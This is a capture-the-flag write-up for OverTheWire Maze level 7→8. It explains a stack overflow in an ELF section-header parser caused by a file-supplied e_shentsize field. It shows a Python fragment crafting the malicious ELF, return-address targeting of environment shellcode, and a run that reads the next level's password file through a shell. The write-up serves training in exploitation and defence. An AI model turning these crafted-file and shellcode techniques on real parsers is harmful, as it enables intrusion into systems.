# OverTheWire — Maze Level 7 → 8

> Goal: Get `maze8` password from `maze7`. Result: **`**********`** (hidden)
> Technique: **Buffer overflow via a file-supplied size field (`e_shentsize`)** overflowing a
> fixed stack buffer in an ELF section-header parser → overwrite return address → env shellcode
> (NX disabled).

---

## 1. First Look
```bash
/maze/maze7 file        # usage: /maze/maze7 file
checksec: No canary | NX DISABLED | No PIE | No RELRO
```
The program reads the file in argv[1] as an **ELF** and dumps its section headers.

## 2. Analysis
`main`: reads the first 52 bytes (ELF header) and extracts these fields → passes to `Print_Shdrs`:
| Field | ELF offset | Role |
|-------|-----------|------|
| `e_shoff` | 0x20 | file offset of the section-header table |
| `e_shstrndx` | 0x32 | string-table section index |
| `e_shnum` | 0x30 | number of sections (loop count) |
| `e_shentsize` | 0x2e | **size of each section header** |

`Print_Shdrs` (summary):
```c
Elf32_Shdr local;             // [ebp-0x3c]  FIXED stack buffer
...
for (i = 0; i <= shnum; i++) {
    read(fd, &local, shentsize);   // <-- shentsize FROM FILE; no bounds check!
    printf("%2d: %-16s\t0x%08x\t0x%04x\n", i, strtab+local.sh_name, local.sh_addr, local.sh_size);
}
```

## 3. Vulnerability
`read(fd, &local, shentsize)` — `local` is at offset 0x3c; from `[ebp-0x3c]` to `[ebp+4]`
(return address) is **0x40 bytes**. Setting `e_shentsize > 0x40` causes the read to **overwrite
the return address**. The bytes read come from our file, so we have **full control**. NX disabled
→ point the return address at shellcode in the environment.

> The loop runs `i <= shnum` (off-by-one). With `shnum=1` there are 2 iterations; the **last**
> `read` determines the return address. I placed two identical blocks so both iterations set
> `ret = shellcode`.

## 4. Crafted ELF (200 bytes)
```python
f[0x20:0x24] = p32(0x40)     # e_shoff = 0x40
f[0x2e:0x30] = p16(0x44)     # e_shentsize = 0x44  (>0x40 -> overflow)
f[0x30:0x32] = p16(1)        # e_shnum = 1
f[0x32:0x34] = p16(0)        # e_shstrndx = 0
# block @0x40 (shdrs + loop i=0):
f[0x40+0x10:..] = p32(0)     # sh_offset (strtab) = 0   (avoid crash)
f[0x40+0x14:..] = p32(0x10)  # sh_size  (strtab) = 0x10
f[0x40+0x40:..] = p32(target)# ret  (i=0)
# block @0x84 (loop i=1, FINAL read):
f[0x84+0x40:..] = p32(target)# ret  (final)
```
`target` = address of the NOP-sled+shellcode in env (ASLR off; found with a matched printer).
File bytes are **free of nulls** (no memfrob/strcpy) → addresses can be embedded freely.

## 5. Exploit
```bash
printf 'cat /etc/maze_pass/maze8\n' | python3 x.py
# SC=0xffffddc0 target=0xffffdec0
# uid=15008(maze8) ... <maze8 password>
```
When `Print_Shdrs` returns, execution jumps to `target` (shellcode) → `setresuid` +
`execve("/bin/sh")` → maze8.

## Lessons
| Topic | Note |
|-------|------|
| Parser overflow | A **size field from file/network** read into a fixed buffer causes overflow (ELF/PE/PDF parsers are classic targets) |
| Untrusted metadata | `e_shentsize`/`e_shnum` are attacker-controlled; never assume bounds |
| Off-by-one (`<=`) | Loop runs one extra iteration; "last write wins" — place payload accordingly |
| NX disabled + ret2env | Point return address to shellcode in env; file data can contain nulls freely so addressing is easy |
| Robustness | Set `sh_offset/sh_size` and `sh_name` to small/valid values so the strtab read doesn't crash |
